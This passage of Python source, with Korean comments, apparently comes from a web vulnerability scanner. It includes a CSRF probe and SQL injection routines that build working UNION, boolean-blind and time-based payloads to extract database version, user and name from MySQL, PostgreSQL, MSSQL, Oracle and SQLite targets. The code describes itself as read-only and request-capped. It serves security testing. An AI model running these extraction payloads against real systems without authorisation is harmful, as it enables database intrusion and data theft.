            f"흔한 비밀번호 사전 {_crack_tries}회, 총 {_total}회 시도 내내 계정 잠금·rate limit(HTTP 429)·"
            f"CAPTCHA·지연이 전혀 발동하지 않았습니다(각 시도가 동일하게 반려). 즉 시도 횟수 제한이 없어 "
            "공격자가 무제한 대입으로 비밀번호/인증번호를 알아낼 수 있습니다(무차별 대입 가능). "
            "이번 점검의 흔한-비밀번호 사전에는 적중하지 않았으나(대상 비밀번호가 사전 밖), 임계치가 없으므로 "
            "더 큰 사전·전수 대입이면 시간 문제로 성공합니다. ※ 비파괴: 사전은 흔한 약한 비밀번호만 사용."),
        "affected_endpoints": [action],
    }


async def _probe_csrf_dynamic(session, base_url: str, points=None,
                              discovered_urls=None) -> dict | None:
    """동적 CSRF 검증(ENABLE_CSRF_DYNAMIC=true 일 때만). 교차출처 Origin + 토큰 제거로 상태변경
    폼을 재전송해 서버가 수락하는지 실측한다. 인증정보 독립(세션쿠키 있으면 사용). 비파괴:
    비가역/민감 폼 제외 + 무해 마커 데이터."""
    if os.getenv("ENABLE_CSRF_DYNAMIC", "false").strip().lower() not in ("1", "true", "yes", "on"):
        return None
    try:
        import csrf_dynamic as cd
        import input_points as ip
    except Exception:
        return None

    urls, seen, all_points = [base_url] + list(discovered_urls or [])[:8], set(), []
    for u in urls:
        if not u or u in seen:
            continue
        seen.add(u)
        _, body, _ = await _get(session, u)
        if body:
            try:
                all_points.extend(ip.parse_forms(body, u))
            except Exception:
                pass
    forms = cd.group_post_forms(all_points)
    if not forms:
        return None

    has_session = False
    try:
        has_session = len(list(session.cookie_jar)) > 0
    except Exception:
        pass

    async def post_fn(url, data, headers):
        st, b, hdr = await _post(session, url, data=data, headers=headers)
        return {"status": st, "body": b, "final_url": (hdr or {}).get("Location") or url}

    try:
        _max = max(1, min(20, int(os.getenv("CSRF_DYNAMIC_MAX_FORMS", "8"))))
    except (TypeError, ValueError):
        _max = 8
    seen_action, results = set(), []
    for form in forms:
        act = form.get("action")
        if not act or act in seen_action:
            continue
        seen_action.add(act)
        if len(results) >= _max:
            break
        results.append(await cd.verify_csrf(form, post_fn, has_session=has_session))
    flagged = [r for r in results if r.get("status") == cd.CSRF_ENFORCEMENT_MISSING]
    return {"enabled": True, "results": results, "flagged": flagged,
            "forms_tested": len(results), "has_session": has_session}


async def _sqli_extract_proof(session, pt: dict, param: str, scan_id: str = "") -> dict | None:
    """SQL 인젝션 확증 뒤 '실제 데이터 추출' 실증 — 단순 오류/신호가 아니라 UNION SELECT 로
    서버 메타데이터(DB 버전·현재 사용자·DB명)를 실제로 추출해 '진짜 동작함'을 증명한다.

    안전(비파괴): version()/current_user()/database() 등 읽기 전용 함수만 사용 —
    사용자 자격증명·실데이터 대량 유출이나 쓰기(DROP/UPDATE) 없음. 컬럼 수/컨텍스트(따옴표·숫자)
    를 자동 탐지하고, 고유 마커로 감싸 응답에서 정확히 파싱한다. 첫 성공에서 즉시 반환(비용 억제).
    """
    try:
        base_params = dict(pt.get("params") or {})
        orig = str(base_params.get(param, "1"))
        method = pt.get("method", "GET")
        url = pt.get("url", "")
        mk = "EOX" + secrets.token_hex(3)
        mk_hex = "0x" + mk.encode().hex()
        sep = "0x7c7c"   # '||'
        # 읽기 전용 메타데이터 추출식(MySQL/MariaDB). 마커로 감싸 정확 파싱.
        expr = (f"CONCAT({mk_hex},IFNULL(version(),0x3f),{sep},"
                f"IFNULL(current_user(),0x3f),{sep},IFNULL(database(),0x3f),{mk_hex})")
        suffix = "-- -"
        # ★똑똑한 추출(부하 최소·탐지력 유지): 무작정 컬럼수를 전탐색하지 않고,
        #  ORDER BY N 으로 '컬럼 수를 먼저 확정'한 뒤 그 컬럼수로만 UNION 추출한다.
        #  총 요청이 대략 (컬럼수+각 컨텍스트 몇) 수준으로 급감 → 대상 연결포화/스캔중단 방지.
        #  안전망으로 총량 상한(≤24)도 유지. 컨텍스트: 문자열(') · 숫자 · 겹따옴표(").
        _MAX_EXT_REQ = 24
        _tries = 0

        async def _fetch(payload):
            nonlocal _tries
            _tries += 1
            tp = {**base_params, param: payload}
            try:
                if method == "POST":
                    _, b, _ = await _post(session, url, data=tp)
                    return url, b
                pu = url + "?" + urllib.parse.urlencode(tp)
                _, b, _ = await _get(session, pu)
                return pu, b
            except Exception:
                return None, None

        # 정상(주입 없는) 응답 길이 — ORDER BY 판정 기준선. 에러/die 스텁은 이보다 훨씬 짧다.
        _, _base_body = await _fetch(str(orig))
        _base_len = len(_base_body or "")
        _ok_min = max(200, int(_base_len * 0.5))   # 정상 페이지면 기준선의 절반 이상
        for quote in ("'", "", '"'):
            if _tries >= _MAX_EXT_REQ:
                break
            # 1) 컬럼 수 확정: ORDER BY N 이 '정상 페이지'인 최대 N. N+1 에서 에러/붕괴(짧은 스텁).
            #    (SQL 에러 문구가 안 잡히는 die 스텁도 있으므로 길이 기준으로 판정 — 에러=짧음.)
            ncols = 0
            for n in range(1, 9):
                if _tries >= _MAX_EXT_REQ:
                    break
                _, ob = await _fetch(f"{orig}{quote} ORDER BY {n}{suffix}")
                ok = bool(ob) and not _SQL_ERR.search(ob or "") and len(ob) >= _ok_min
                if ok:
                    ncols = n
                else:
                    break
            if ncols < 1:
                continue
            # 2) 확정된 컬럼수로만 UNION 추출(슬롯을 순회하며 마커 검색).
            _matched = False
            for slot in range(ncols):
                if _tries >= _MAX_EXT_REQ:
                    break
                cols = ",".join(expr if i == slot else "NULL" for i in range(ncols))
                payload = f"{orig}{quote} UNION SELECT {cols}{suffix}"
                proof_url, body = await _fetch(payload)
                if not body or mk not in body:
                    continue
                m = re.search(re.escape(mk) + r"(.*?)" + re.escape(mk), body, re.S)
                if not m:
                    continue
                parts = m.group(1).split("||")
                dbver = (parts[0] if len(parts) > 0 else "").strip()[:90]
                dbusr = (parts[1] if len(parts) > 1 else "").strip()[:60]
                dbnam = (parts[2] if len(parts) > 2 else "").strip()[:60]
                if not dbver and not dbusr and not dbnam:
                    continue
                # ★증거 스크린샷: '에러 화면'이 아니라 UNION 으로 실제 데이터가 표시된 '주입 성공'
                #  화면을 캡처한다(GET 만 — 전체 페이지에 추출값이 렌더됨). 에러 응답만 찍혀
                #  "반응이 아니라 에러"로 보이던 문제 교정.
                _ext_shots = []
                if scan_id and method != "POST":
                    _summ = " · ".join([x for x in (
                        f"DB버전={dbver}" if dbver else "",
                        f"사용자={dbusr}" if dbusr else "",
                        f"DB명={dbnam}" if dbnam else "") if x])
                    try:
                        _ext_shots = await _capture_step_shots(scan_id, [
                            (url,
                             f"【1단계】 점검 대상 접속 · 파라미터 '{param}'",
                             "#1E3A5F", "left"),
                            (proof_url,
                             f"【2단계】 UNION SELECT 주입 — 서버 메타데이터 질의\n페이로드: {payload[:90]}",
                             "#B45309", "left"),
                            (proof_url,
                             f"【3단계】 ★ SQL 인젝션 데이터 추출 성공(에러 아님)\n"
                             f"응답 페이지에 실제 추출값 표시됨:\n{_summ}",
                             "#059669", "center"),
                        ], f"sqli_extract_{param[:8]}")
                    except Exception:
                        _ext_shots = []
                return {
                    "extracted": True, "columns": ncols,
                    "db_version": dbver, "db_user": dbusr, "db_name": dbnam,
                    "proof_url": proof_url, "proof_payload": payload,
                    "evidence_screenshots": _ext_shots,
                }
        return None
    except Exception:
        return None


async def _sqli_blind_extract(session, pt: dict, param: str, scan_id: str = "",
                              max_chars: int = 12) -> dict | None:
    """불린 블라인드 SQLi 확증(PROOF) — 참/거짓 응답 오라클로 database() 를 '문자 단위' 실제 추출.
    데이터가 직접 노출되지 않는 블라인드에서도 '실제로 DB 를 읽어냄'을 증거(추출 문자열)로 남긴다.
    읽기 전용(SELECT DATABASE()·ASCII·SUBSTRING)·비파괴. 요청 총량 상한으로 대상 부하 억제.
    """
    import difflib
    base = dict(pt.get("params") or {})
    orig = str(base.get(param, "1"))
    method = pt.get("method", "GET")
    url = pt.get("url", "")

    async def _fetch(payload):
        p = {**base, param: payload}
        try:
            if method == "POST":
                _, b, _ = await _post(session, url, data=p)
            else:
                _, b, _ = await _get(session, url + "?" + urllib.parse.urlencode(p))
            return b or ""
        except Exception:
            return ""

    def _sim(a, b):
        return difflib.SequenceMatcher(None, " ".join((a or "")[:6000].split()),
                                       " ".join((b or "")[:6000].split())).quick_ratio()

    def _true_marker(bt, bf):
        """참 응답에만 있고 거짓엔 없는 판별 문자열(라인). 미세한 exists/missing 차이도 잡는다."""
        _ft = [l.strip() for l in (bt or "").splitlines() if l.strip()]
        _ff = set(l.strip() for l in (bf or "").splitlines() if l.strip())
        for l in _ft:
            if l not in _ff and 4 <= len(l) <= 300:
                return l
        return None

    _MAX = 96  # 요청 총량 상한(대상 부하·연속실패 방어)
    for pre, suf in ((f"{orig}' AND ", "-- -"), (f"{orig} AND ", "-- -"), (f'{orig}" AND ', "-- -")):
        bt = await _fetch(f"{pre}1=1{suf}")
        bf = await _fetch(f"{pre}1=2{suf}")
        if not bt or not bf:
            continue
        _mk = _true_marker(bt, bf)   # 참에만 있는 마커 우선(신뢰도 높음)
        if not _mk and _sim(bt, bf) >= 0.97:
            continue   # 마커도 없고 유사도도 높음 → 참/거짓 구분 불가, 다음 컨텍스트
        _tref, _fref = bt, bf
        _n = [2]  # 이미 2회 사용

        async def _cond(expr):
            _n[0] += 1
            r = await _fetch(f"{pre}({expr}){suf}")
            if _mk:
                return _mk in r
            return _sim(r, _tref) >= _sim(r, _fref)

        # ★DB 이식성: 블라인드는 특정 DBMS 만이 아니라 어떤 DB 든 잡아야 한다. DBMS 별 '한 글자 코드값'
        #  추출식을 모두 시도하고, 실제로 추출되는(첫 글자가 유효 출력문자) DBMS 를 채택한다.
        #  label, 값이름, i번째 글자의 코드값 추출식 빌더(op·mid 는 호출측에서 부착).
        def _mysql(i):  return f"ASCII(SUBSTRING((SELECT DATABASE()),{i},1))"
        def _pg(i):     return f"ASCII(SUBSTRING((SELECT current_database()) FROM {i} FOR 1))"
        def _mssql(i):  return f"UNICODE(SUBSTRING((SELECT DB_NAME()),{i},1))"
        def _oracle(i): return f"ASCII(SUBSTR((SELECT USER FROM DUAL),{i},1))"
        def _sqlite(i): return f"UNICODE(SUBSTR((SELECT sqlite_version()),{i},1))"
        _dbms_list = [("MySQL/MariaDB", "DATABASE()", _mysql),
                      ("PostgreSQL", "current_database()", _pg),
                      ("MSSQL", "DB_NAME()", _mssql),
                      ("Oracle", "USER", _oracle),
                      ("SQLite", "sqlite_version()", _sqlite)]
        for _dbms, _valname, _charexpr in _dbms_list:
            if _n[0] > _MAX:
                break
            # 이 DBMS 구문이 유효한지: 1번째 글자가 존재(>0)하는지로 판별(구문오류면 거짓 고정)
            if not await _cond(f"{_charexpr(1)}>0"):
                continue
            out = ""
            for i in range(1, max_chars + 1):
                if _n[0] > _MAX:
                    break
                if i > 1 and not await _cond(f"{_charexpr(i)}>0"):
                    break   # 문자열 끝(널)
                lo, hi = 32, 126
                while lo < hi and _n[0] <= _MAX:
                    mid = (lo + hi) // 2
                    if await _cond(f"{_charexpr(i)}>{mid}"):
                        lo = mid + 1
                    else:
                        hi = mid
                out += chr(lo)
            if out and any(32 <= ord(c) <= 126 for c in out):
                # 구체 실증: 추출된 각 문자를 '사람이 그대로 재현할 수 있는 확정 payload'로 남긴다
                # (N,X 플레이스홀더만으론 '어떻게 뽑았는지' 안 보인다는 피드백 반영).
                _trace = []
                for _i in range(1, min(3, len(out)) + 1):
                    _c = out[_i - 1]
                    _cc = ord(_c)
                    _trace.append(
                        f"{_i}번째 문자: {pre}({_charexpr(_i)}={_cc}){suf}  → 참(true)"
                        f"  ⇒ '{_c}' (ASCII {_cc}) 확정")
                _code0 = ord(out[0])
                _proof_example = (
                    f"{pre}({_charexpr(1)}={_code0}){suf}  → 참(true) / "
                    f"{pre}({_charexpr(1)}={_code0 + 1}){suf}  → 거짓(false)  "
                    f"⇒ 1번째 문자='{out[0]}'")
                return {
                    "extracted": True, "technique": "boolean_blind",
                    "dbms": _dbms, "value_name": _valname, "db_name": out,
                    "requests": _n[0],
                    "oracle": (f"참 판별: 응답에 '{_mk[:60]}' 포함 여부" if _mk
                               else "참 판별: 응답이 참-기준 응답과 더 유사"),
                    "proof_payload": f"{pre}({_charexpr('N')}>X){suf}",   # 일반형(N번째 문자, 경계 X)
                    "proof_example": _proof_example,                      # 구체 예시(실제 값)
                    "proof_trace": _trace,                                # 앞 몇 글자 확정 과정
                    "context": ("string" if pre.endswith("' AND ")
                                else "double" if pre.endswith('" AND ') else "numeric"),
                }

    # ── 시간 기반(time-based) 폴백 — 기본 OFF(명시적 opt-in) ──
    # 참/거짓의 '화면 차이'가 전혀 없어 불린 오라클이 성립 못하는 '완전 블라인드'에서, 조건부 지연(SLEEP)의
    # '응답 시간 차이'로 값을 추출한다(화면 무변화 대상 커버 → 범용성↑).
    # ⚠️ 단, SLEEP 은 DB 연결을 붙잡아 서버 부하(미니 DoS 성)를 주기 쉽다 → 기본적으로 수행하지 않는다.
    #    대상이 감당 가능하다고 판단될 때만 ENABLE_TIME_BLIND_EXTRACT=true 로 켠다(발자국도 최소화).
    if os.getenv("ENABLE_TIME_BLIND_EXTRACT", "false").strip().lower() not in ("1", "true", "yes", "on"):
        return None
    try:
        # 지연값은 '구분만 될 정도로' 작게 준다(길수록 서버 부하·위험↑). 기본 1.0초, 하한 0.5초.
        try:
            _T = max(0.5, min(3.0, float(os.getenv("TIME_BLIND_SLEEP_SEC", "1.0"))))
        except (TypeError, ValueError):
            _T = 1.0
        _nt = [0]
        _TMAX = 48   # 부하 억제: 총 질의 상한(앞 4글자 실증 수준)

        async def _elapsed(pl):
            _nt[0] += 1
            p = {**base, param: pl}
            _t0 = time.monotonic()
            try:
                if method == "POST":
                    await _post(session, url, data=p)
                else:
                    await _get(session, url + "?" + urllib.parse.urlencode(p))
            except Exception:
                return 0.0
            return time.monotonic() - _t0

        _bt = min(await _elapsed(orig), await _elapsed(orig))   # 정상(무지연) 기준 시간
        _delay_thresh = _bt + _T * 0.6                          # 이 이상 걸리면 '지연 발생(참)'으로 판정

        # DBMS·컨텍스트별: (라벨, 값이름, i번째 문자 코드 추출식, cond→조건부지연 payload 빌더)
        def _wrap_my(cond, q):  # MySQL/MariaDB
            _pre = f"{orig}{q} AND " if q else f"{orig} AND "
            _suf = "-- -"
            return f"{_pre}IF(({cond}),SLEEP({_T}),0){_suf}"
        def _wrap_pg(cond, q):  # PostgreSQL(스택/서브쿼리)
            _pre = f"{orig}{q}" if q else f"{orig}"
            return f"{_pre}; SELECT CASE WHEN ({cond}) THEN pg_sleep({_T}) ELSE pg_sleep(0) END-- -"
        def _wrap_ms(cond, q):  # MSSQL(스택) — WAITFOR DELAY 는 'hh:mm:ss.mmm'(소수초 지원)
            _pre = f"{orig}{q}" if q else f"{orig}"
            return f"{_pre}; IF(({cond})) WAITFOR DELAY '00:00:%06.3f'-- -" % _T

        _mysql_c = lambda i: f"ASCII(SUBSTRING((SELECT DATABASE()),{i},1))"
        _pg_c = lambda i: f"ASCII(SUBSTRING((SELECT current_database()) FROM {i} FOR 1))"
        _ms_c = lambda i: f"UNICODE(SUBSTRING((SELECT DB_NAME()),{i},1))"
        _variants = [
            ("MySQL/MariaDB", "DATABASE()", _mysql_c, _wrap_my, "'"),
            ("MySQL/MariaDB", "DATABASE()", _mysql_c, _wrap_my, ""),
            ("MySQL/MariaDB", "DATABASE()", _mysql_c, _wrap_my, '"'),
            ("PostgreSQL", "current_database()", _pg_c, _wrap_pg, "'"),
            ("PostgreSQL", "current_database()", _pg_c, _wrap_pg, ""),
            ("MSSQL", "DB_NAME()", _ms_c, _wrap_ms, "'"),
            ("MSSQL", "DB_NAME()", _ms_c, _wrap_ms, ""),
        ]
        for _dbms, _valname, _cexpr, _wrap, _q in _variants:
            if _nt[0] > _TMAX:
                break
            # 시간 주입 가능 확인: 참(1=1)이면 지연, 거짓(1=2)이면 무지연이어야 한다(둘 다 성립해야 채택).
            if await _elapsed(_wrap("1=1", _q)) < _delay_thresh:
                continue
            if await _elapsed(_wrap("1=2", _q)) >= _delay_thresh:
                continue   # 거짓인데도 지연 → 시간 신호 아님(불안정), 다음 변형

            async def _tcond(expr):
                return (await _elapsed(_wrap(expr, _q))) >= _delay_thresh

            out = ""
            _mx = 4   # 부하 억제: 앞 4글자만 실증(기법 증명엔 충분)
            for i in range(1, _mx + 1):
                if _nt[0] > _TMAX:
                    break
                if i > 1 and not await _tcond(f"{_cexpr(i)}>0"):
                    break
                lo, hi = 32, 126
                while lo < hi and _nt[0] <= _TMAX:
                    mid = (lo + hi) // 2
                    if await _tcond(f"{_cexpr(i)}>{mid}"):
                        lo = mid + 1
                    else:
                        hi = mid
                out += chr(lo)
            if out and any(32 <= ord(c) <= 126 for c in out):
                _code0 = ord(out[0])
                _ex = _wrap(f"{_cexpr(1)}>{_code0 - 1}", _q)
                return {
                    "extracted": True, "technique": "time_based_blind",
                    "dbms": _dbms, "value_name": _valname, "db_name": out,
                    "requests": _nt[0], "partial": len(out) >= _mx,
                    "oracle": f"참 판별: 응답 지연 ≥ {round(_delay_thresh, 2)}초(SLEEP {_T}s), 기준 {round(_bt, 2)}초",
                    "proof_payload": _wrap(f"{_cexpr('N')}>X", _q),
                    "proof_example": f"{_ex}  → 응답 {round(_T, 1)}초+ 지연(참) ⇒ 1번째 문자='{out[0]}'",
                    "proof_trace": [
                        f"{_i}번째 문자: {_wrap(f'{_cexpr(_i)}>{ord(out[_i-1]) - 1}', _q)} → 지연(참) ⇒ '{out[_i-1]}'"
                        for _i in range(1, min(3, len(out)) + 1)],
                    "context": ("string" if _q == "'" else "double" if _q == '"' else "numeric"),
                }
    except Exception:
        pass
    return None


async def _orchestrate_sqli(session, points: list[dict], scan_id: str = "") -> dict | None:
    """SQL 인젝션 기법 오케스트레이션 — blind(불린/시간)가 앞 기법 성공에 가려 실행되지
    않던 문제를 해소한다.
      1) error → union : 무-지연. 첫 확정에서 단락(빠른 확정).
      2) boolean blind : 지연 없음 → error/union 결과와 무관하게 '항상' 수행(blind 커버리지 보장).
      3) time blind    : SLEEP/WAITFOR 로 지연이 크므로, 위에서 아무 것도 확정 못했을 때만 최후수단.
    확정된 기법은 모두 수집해 대표 1건 + additional_confirmations(다중 벡터 증거)로 남긴다.
    """
    points = _prioritize_sqli_points(points)   # 전형적 SQLi 표면을 앞으로(캡 절단 대비)
    hits: list[dict] = []
    ev = None
    for fn in (lambda: _probe_sqli_error(session, points, scan_id=scan_id),
               lambda: _probe_sqli_union(session, points, scan_id=scan_id)):
        if ev is None:
            ev = await fn()
    if ev:
        hits.append(ev)
    # boolean 블라인드는 항상 독립 수행(지연 없음) — 앞 기법 성공 여부와 무관
    bl = await _probe_sqli_bool(session, points)
    if bl and bl not in hits:
        hits.append(bl)
    # time 블라인드(지연 큼)는 아무 기법도 확정 못했을 때만
    if not hits:
        tb = await _probe_sqli_time(session, points)
        if tb:
            hits.append(tb)
    # 커버리지 정직성: blind(불린)가 실제로 수행됐음을 기록(time 은 error/union 미확정 시 수행)
    try:
        _cov_add(scan_id, sqli_blind_performed=1, sqli_time_performed=(0 if ev else 1))
    except Exception:
        pass
    if not hits:
        return None
    result = hits[0]
    if len(hits) > 1:
        result["additional_confirmations"] = [
            {"type": h.get("type"), "param": h.get("param"),
             "url": h.get("url"), "evidence": h.get("evidence")}
            for h in hits[1:]
        ]
    # ★데이터 추출 실증: 확증된 지점에서 실제로 서버 메타데이터(버전·사용자·DB명)를 UNION 으로
    # 추출해 '단순 오류 신호'를 넘어 '진짜 주입 동작함'을 증거로 보인다(읽기 전용·비파괴).
    try:
        _cparam = result.get("param")
        _cpt = None
        for _p in points:
            if _cparam and _cparam in (_p.get("params") or {}) and (
                    _p.get("url") and _p.get("url") in str(result.get("url") or _p.get("url"))):
                _cpt = _p
                break
        if _cpt is None:   # url 매칭 실패 시 param 만으로 후보
            for _p in points:
                if _cparam and _cparam in (_p.get("params") or {}):
                    _cpt = _p
                    break
        # 블라인드(불린) 확증은 UNION 으로 데이터가 안 보이므로 PROOF 에서 '블라인드 문자추출'로 실증.
        _is_blind = str(result.get("type", "")) in ("boolean_based", "time_based")
        _proof_on = False
        try:
            import validation_profiles as _vpb
            _proof_on = bool(_vpb.proof_active())
        except Exception:
            _proof_on = False
        if _cpt is not None and _is_blind and _proof_on:
            _bx = await _sqli_blind_extract(session, _cpt, _cparam, scan_id=scan_id)
            if _bx and _bx.get("extracted"):
                result["extracted_data"] = _bx
                result["blind_confirmed"] = True
                result["evidence"] = (str(result.get("evidence", "")).rstrip() +
                    f"\n[블라인드 데이터 추출 실증] 참/거짓 판별로 값을 '문자 단위' 실제 추출 "
                    f"(DBMS={_bx.get('dbms')}): {_bx.get('value_name')}='{_bx.get('db_name')}' "
                    f"({_bx.get('requests')}회 질의, 읽기전용·비파괴). 추출식: {_bx.get('proof_payload')}")
        elif _cpt is not None:
            _ext = await _sqli_extract_proof(session, _cpt, _cparam, scan_id=scan_id)
            if _ext and _ext.get("extracted"):
                result["extracted_data"] = {k: v for k, v in _ext.items()
                                            if k != "evidence_screenshots"}
                _bits = []
                if _ext.get("db_version"): _bits.append(f"DB버전={_ext['db_version']}")
                if _ext.get("db_user"): _bits.append(f"현재사용자={_ext['db_user']}")
                if _ext.get("db_name"): _bits.append(f"DB명={_ext['db_name']}")
                # 증거를 '주입 위치 → 주입 payload → 추출 결과' 순으로 앞세운다(에러 메시지만 보이고
                # 어디에 어떤 payload 로 실증했는지 안 보인다는 피드백 반영). 에러는 보조 신호로 뒤에.
                _prior_err = str(result.get("evidence", "")).strip()
                _pp = str(_ext.get("proof_payload") or "")
                result["payload"] = _pp or result.get("payload")   # 표시 payload = '데이터를 뽑은' 추출 payload
                result["evidence"] = (
                    f"주입 위치: 파라미터 '{result.get('param')}' @ {result.get('url','')} "
                    f"({result.get('method','GET')})\n"
                    f"주입 payload: {_pp}\n"
                    f"[데이터 추출 실증] 위 payload 의 UNION SELECT 로 서버 메타데이터 실제 추출: "
                    + ", ".join(_bits) + " (읽기전용·비파괴)\n"
                    f"재현 URL: {_ext.get('proof_url','')[:200]}"
                    + (f"\n[추가 신호] 홑따옴표(') 주입 시 DB 오류 노출(DBMS 정보 확인): "
                       f"{_prior_err[:180]}" if _prior_err else ""))
                result["repro_url"] = _ext.get("proof_url") or result.get("repro_url")
                # 데이터 추출 실증(버전 등)이 성공하면 '에러 화면' 스크린샷은 오히려 혼동을 주므로
                # 제거하고 추출 스크린샷만 남긴다(사용자 요구). 대신 에러 메시지가 DBMS/서버 정보를
                # 노출하면 그건 별도의 '에러페이지 정보노출(CWE-209)' finding 으로 분리 신호를 남긴다.
                _es = _ext.get("evidence_screenshots") or []
                if _es:
                    result["evidence_screenshots"] = _es
            elif _cpt is not None and _cparam:
                # 추출 실패(예: 컬럼 정렬 안 맞음)라도 최상단 재현명령은 '시연용'이 되게 —
                # 에러만 뜨는 id=' 대신 '항상 참(OR 1=1)'으로 전체 레코드 반환을 보이는 URL 로 대체.
                try:
                    _bp = dict(_cpt.get("params") or {})
                    _orig = str(_bp.get(_cparam, "1"))
                    _demo = {**_bp, _cparam: f"{_orig}' OR '1'='1"}
                    if _cpt.get("method", "GET") != "POST":
                        result["repro_url"] = (_cpt.get("url", "") + "?" +
                                               urllib.parse.urlencode(_demo))
                except Exception:
                    pass

        # ── 에러페이지 정보노출(CWE-209) 분리 실증 ──
        # SQLi 확증 과정에서 서버가 DB 오류 메시지를 화면에 그대로 노출했다면, 그 자체를 별도 취약점으로
        # 스핀오프한다. 추출 성공/실패와 무관하게 error_snippet(DB오류)이 있으면 성립한다.
        # 실증 스크린샷은 '접속내용'을 재사용하지 않고, 구문오류(홑따옴표)를 유발하는 URL 로 직접 접속해
        # '오류 메시지가 실제로 화면에 노출됨'을 캡처한다(어떤 정보가 새는지 오버레이로 명시).
        _snip = str(result.get("error_snippet") or "") if result else ""
        if _snip and _SQL_ERR.search(_snip):
            _leak = _classify_error_leak(_snip)
            _emethod = (_cpt.get("method", "GET") if _cpt else "GET")
            _eparam = _cparam or (result.get("param") if result else "") or ""
            _epayload = f"{str((_cpt.get('params') or {}).get(_eparam, '1')) if _cpt else '1'}'"  # 구문오류 유발값
            _err_url = (result.get("repro_url") or result.get("url") or "") if result else ""
            # '어디서 발생했는지'가 명확하도록 정확한 요청(method + 전체 파라미터)을 남긴다.
            _req_line = ""
            _disc_shots: list = []
            try:
                if _cpt is not None and _eparam and scan_id:
                    _bp2 = dict(_cpt.get("params") or {})
                    _trg = {**_bp2, _eparam: str(_bp2.get(_eparam, "1")) + "'"}   # 홑따옴표 → 구문오류
                    _overlay = ("【에러페이지 정보노출·CWE-209】 구문오류 유발 입력 → 서버가 DB 오류 메시지를 "
                                f"그대로 출력\n노출 정보: {_leak.get('label','')}\n발췌: {_snip[:110]}")
                    if _emethod != "POST":
                        # GET: 오류 URL 직접 접속 스샷(오류 화면 그대로 노출).
                        _err_url = _cpt.get("url", "") + "?" + urllib.parse.urlencode(_trg)
                        _req_line = f"GET {_err_url}"
                        _disc_shots = await _capture_step_shots(scan_id, [
                            (_err_url, _overlay, "#B45309", "bottom"),
                        ], f"errdisc_{re.sub(chr(92)+chr(87),'_', _err_url)[-16:]}")
                    else:
                        # POST: GET 이동으론 폼만 찍히므로 '폼을 실제 제출'해 오류 응답을 캡처한다.
                        _act = _cpt.get("url", "")
                        _req_line = (f"POST {_act}  본문: "
                                     + "&".join(f"{k}={v}" for k, v in _trg.items()))
                        _disc_shots = await _capture_form_submit_shot(
                            scan_id, _act, _act, _eparam, _trg.get(_eparam, "1'"),
                            _bp2, _overlay, f"errdisc_{re.sub(chr(92)+chr(87),'_', _act)[-14:]}")
            except Exception:
                _disc_shots = []
            result["_error_disclosure"] = {
                "snippet": _snip[:300],
                "url": _err_url,
                "method": _emethod, "param": _eparam, "request_line": _req_line,
                "screenshots": _disc_shots,
                "leak_kinds": _leak,
            }
    except Exception:
        pass

    # ★블라인드 SQLi 전용 스윕(PROOF): 대표가 에러/유니온으로 잡혀도, 데이터가 화면에 안 보이는
    #  '블라인드 전용' 취약 지점(예: /sqli_blind/)은 별도로 참/거짓 추출로 확증해
    #  additional_confirmations 에 남긴다. _sqli_blind_extract 가 참/거짓 차등 없으면 즉시 반환하므로
    #  자기-게이팅(비취약 지점은 2요청). 요청 상한: 최대 5지점·블라인드 확증 1건 확보 시 종료.
    try:
        import validation_profiles as _vps
        _proof2 = bool(_vps.proof_active())
    except Exception:
        _proof2 = False
    try:
        if _proof2 and result is not None:
            _prim_url = str(result.get("url", "")).split("?")[0]
            _already = bool(result.get("blind_confirmed"))
            _blind_extra = []
            _swept = 0
            # 상한 8(기존 5) — 인증영역에 지점이 많아(6000+ 입력) 전용 블라인드 엔드포인트가
            # 앞 5개 밖으로 밀려 sweep 이 못 닿던 문제 완화(+ _sqli_point_score 의 blind 우대와 병행).
            for _p in _prioritize_sqli_points(points):
                if _swept >= 8 or _blind_extra:
                    break
                _purl = str(_p.get("url", "")).split("?")[0]
                if not _purl or (_purl == _prim_url and _already):
                    continue
                _cands = [k for k in (_p.get("params") or {}) if _SQLI_LIKELY_PARAM.search(str(k))]
                if not _cands:
                    continue
                _swept += 1
                _bx2 = await _sqli_blind_extract(session, _p, _cands[0], scan_id=scan_id)
                if _bx2 and _bx2.get("extracted"):
                    _blind_extra.append({
                        "type": "boolean_blind", "param": _cands[0], "url": _purl,
                        "blind_confirmed": True, "extracted_data": _bx2,
                        "evidence": (f"블라인드 SQL 인젝션 실증({_bx2.get('dbms')}): 참/거짓 판별로 "
                                     f"{_bx2.get('value_name')}='{_bx2.get('db_name')}' 문자단위 추출"
                                     f"({_bx2.get('requests')}회 질의, 읽기전용·비파괴)"),
                    })
            if _blind_extra:
                result["additional_confirmations"] = (result.get("additional_confirmations") or []) + _blind_extra
                result["blind_points"] = [b["url"] for b in _blind_extra]
                # ★블라인드가 '대표 SQLi(에러/유니온)와 다른 엔드포인트'에서 확증되면 별도 finding 으로
                #   승격한다 — 블라인드는 '데이터가 화면에 안 보이는데도 문자단위로 실제 추출'했다는 점이
                #   별개 위험이자 사용자 요구(전용 /sqli_blind/ 모듈 인식). 같은 URL이면 대표에 흡수.
                _distinct = [b for b in _blind_extra if b["url"].split("?")[0] != _prim_url]
                if _distinct:
                    _b0 = _distinct[0]
                    _bd = _b0["extracted_data"] or {}
                    _trace_txt = "\n".join(f"   - {t}" for t in (_bd.get("proof_trace") or []))
                    result["_blind_finding"] = {
                        "type": "boolean_blind", "confirmed": True, "blind_confirmed": True,
                        "url": _b0["url"], "param": _b0["param"],
                        "method": "-",
                        # 발견 위치·재현이 한눈에 보이도록 payload 를 '구체 예시'로 노출.
                        "payload": _bd.get("proof_example") or _bd.get("proof_payload"),
                        "extracted_data": _bd,
                        "extracted_value": f"{_bd.get('value_name')}={_bd.get('db_name')}",
                        "requests": _bd.get("requests"),
                        "dbms": _bd.get("dbms"),
                        "proof_payload": _bd.get("proof_payload"),
                        "technique": _bd.get("technique"),
                        "evidence": (
                            f"주입 위치: 파라미터 '{_b0['param']}' @ {_b0['url']}\n"
                            f"기법: {'시간 기반(응답 지연)' if _bd.get('technique') == 'time_based_blind' else '불린(참/거짓 응답 차이)'} 블라인드\n"
                            f"오라클(참/거짓 판별): {_bd.get('oracle','응답 차이')}\n"
                            f"주입 payload(일반형): {_bd.get('proof_payload')}\n"
                            f"구체 예시: {_bd.get('proof_example','')}\n"
                            + (f"문자 추출 과정(앞부분):\n{_trace_txt}\n" if _trace_txt else "")
                            + f"→ 화면에 데이터가 직접 노출되지 않는데도 "
                            f"{'응답 지연(SLEEP) 유무' if _bd.get('technique') == 'time_based_blind' else '참/거짓 응답 차이'}만으로 "
